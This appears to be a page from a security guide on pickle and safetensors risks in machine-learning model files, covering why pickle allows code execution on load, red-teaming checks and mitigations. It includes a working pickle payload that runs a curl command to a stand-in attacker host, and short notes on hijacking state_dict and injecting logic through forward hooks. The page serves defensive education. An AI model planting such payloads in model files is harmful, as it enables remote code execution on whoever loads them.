# Pickle / Safetensor Payloads

## Pickle / Safetensor Payloads

Many ML ecosystems use serialization formats to save and load model weights. Unfortunately, some formats (notably **Python Pickle**) allow arbitrary code execution on load, making them **critical RCE vectors**.

Even newer formats like `safetensors` can be misused if loading mechanisms are improperly configured or wrappers invoke unsafe libraries.

***

### 🧨 Why This Matters

* PyTorch models downloaded via `from_pretrained()` often load pickled code
* Pickle executes constructors and import logic — can hide backdoors or shell payloads
* GitHub-released models with `.pt`, `.pkl`, `.ckpt` may include arbitrary classes
* `safetensors` solves deserialization safety but doesn't prevent backdoored **weights**

***

### ⚙️ Exploit Examples

#### Python Pickle Payload (injected model class)

```python
import pickle
pickle.loads(b"c__builtin__\neval\n(S'__import__(\"os\").system(\"curl attacker.site\")'\ntR.")
```

#### Torch `state_dict` hijack

* Replace `state_dict` with custom subclass or override internal keys
* Use hooks like `.register_forward_hook()` to inject logic on runtime

***

### 🧪 Red Teaming Tactics

* Scan public model hubs for `.pkl`, `.pt`, `.ckpt` not hosted by trusted orgs
* Use static analysis tools to inspect pickle bytecode
* Check model class source when loading via `from_pretrained()`
* Monitor network and file system activity during model loading

***

### 🛡️ Mitigation Strategies

| Control               | Description                                                   |
| --------------------- | ------------------------------------------------------------- |
| **Use `safetensors`** | Format that prevents arbitrary code on load                   |
| **Signed Models**     | Require model + hash manifest signed by publisher             |
| **Sandboxed Loading** | Isolate the load step from network or disk access             |
| **Audit Before Load** | Manually inspect model class definitions and loading wrappers |

***

### 🔗 Related Pages

* [Custom Layer Injection](https://cosimo.gitbook.io/llm-security/model-manipulation/model-backdoors/custom-layer-injection)
* [Unsafe Model Loading](https://cosimo.gitbook.io/llm-security/supply-chain-and-serialization-risks/unsafe-model-loading)
* [Embedding Space Backdoors](https://cosimo.gitbook.io/llm-security/evaluation-and-hardening/embedding-space-backdoors)

***

### 📚 Resources

* **PyTorch Docs.** [TorchScript Serialization & Pickle Warning](https://pytorch.org/docs/stable/jit.html#serialization)
* **HuggingFace.** [safetensors Format Guide](https://huggingface.co/docs/safetensors/index)
* **USENIX 2024.** [Practical LLM Supply Chain Attacks (Harang)](https://www.usenix.org/conference/usenixsecurity24/presentation/harang)
* **RedHat.** [Pickle RCE in ML Pipelines](https://access.redhat.com/security/cve/CVE-2020-14343)
